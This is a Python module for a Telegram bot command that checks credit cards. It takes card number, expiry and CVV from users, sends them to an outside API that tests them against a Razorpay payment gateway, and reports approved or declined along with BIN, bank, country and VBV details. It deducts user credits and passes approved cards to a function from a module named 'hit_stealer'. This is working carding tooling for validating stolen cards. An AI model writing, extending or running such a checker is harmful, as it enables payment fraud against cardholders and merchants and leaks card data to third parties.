import httpx
import time
import asyncio
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

async def check_razorpay(fullcc: str, session: httpx.AsyncClient) -> dict:
    url = f"https://rockyrockss.onrender.com/api/razorpay/pay?cc={fullcc}"
    try:
        resp = await session.get(url)
        if resp.status_code != 200:
            return {"status": "Api Down ⚠️", "response": f"HTTP {resp.status_code}"}
        result = resp.json()
        status_raw = result.get("Status", "").lower()
        message_resp = result.get("description", "")

        # Map declined message to standard label
        if status_raw == "declined":
            mapped_response = "Payment Cancelled"
        else:
            mapped_response = message_resp

        if status_raw == "approved":
            status = "Approved ✅"
        elif status_raw == "declined":
            status = "Declined ❌"
        else:
            status = "Error ⚠️"

        return {"status": status, "response": mapped_response}
    except Exception as e:
        return {"status": "Api Error ⚠️", "response": str(e)}

@Client.on_message(filters.command("rz", [".", "/"]))
async def razorpay_cmd(client, message):
    try:
        user_id = str(message.from_user.id)
        checkall = await check_all_thing(client, message)
        gateway = "Razorpay Gate"

        if not checkall[0]:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        if not getcc:
            usage = f"""<b>
Gate Name: {gateway} ♻️
CMD: /razorpay

Message: No CC Found in your input ❌

Usage: /razorpay cc|mes|ano|cvv</b>"""
            await message.reply_text(usage, message.id)
            return

        cc, mes, ano, cvv = getcc
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        bin6 = cc[:6]

        first_response = f"""
↯ Checking.

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□
"""
        await asyncio.sleep(0.5)
        first_msg = await message.reply_text(first_response, message.id)

        second_response = f"""
↯ Checking..

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□
"""
        await asyncio.sleep(0.5)
        second_msg = await client.edit_message_text(message.chat.id, first_msg.id, second_response)

        start = time.perf_counter()
        async with httpx.AsyncClient(timeout=30, follow_redirects=True) as session:
            result = await check_razorpay(fullcc, session)

        third_response = f"""
↯ Checking...

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■
"""
        await asyncio.sleep(0.5)
        third_msg = await client.edit_message_text(message.chat.id, second_msg.id, third_response)

        brand, type_, level, bank, country, flag, currency = await get_bin_details(cc)

        vbv_status = "Not Found"
        try:
            with open("FILES/vbvbin.txt", "r", encoding="utf-8") as f:
                vbv_data = f.readlines()
            for line in vbv_data:
                line = line.strip()
                if not line:
                    continue
                parts = line.split("|")
                if parts[0] == bin6:
                    vbv_status = parts[2] if len(parts) > 2 else parts[1]
                    break
        except FileNotFoundError:
            vbv_status = "VBV BIN file missing"

        proxy_status = "Live ✨"
        status = result.get("status", "Unknown")
        response_text = result.get("response", "")

        final_response = f"""
{status}
━━━━━━━━━━━━━
[⟐] 𝗖𝗖 - <code>{fullcc}</code>
[⟐] 𝗦𝘁𝗮𝘁𝘂𝘀 : {response_text}
[⟐] 𝗚𝗮𝘁𝗲 - {gateway}
━━━━━━━━━━━━━
[⟐] 𝗩𝗕𝗩 - {vbv_status}
━━━━━━━━━━━━━
[⟐] B𝗶𝗻 : {bin6}
[⟐] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country} {flag}
[⟐] 𝗜𝘀𝘀𝘂𝗿 : {bank}
[⟐] 𝗧𝘆𝗽𝗲 : {brand} | {type_} - {level}
━━━━━━━━━━━━━
[⟐] T/t : {time.perf_counter() - start:0.2f}s | Proxy : {proxy_status}
[⟐] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a> [ {role} ]
[⟐] 𝗢𝘄𝗻𝗲𝗿: <a href="tg://user?id=8340881349">𝑺𝑷𝑰𝑫𝑬𝑹</a>
╚═════⟐「 ���𝐑� ����𝐄�  」⟐═════╝
"""
        await asyncio.sleep(0.5)
        await client.edit_message_text(message.chat.id, third_msg.id, final_response)

        await setantispamtime(user_id)
        await deductcredit(user_id)

        if status == "Approved ✅":
            await send_hit_if_approved(client, final_response)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())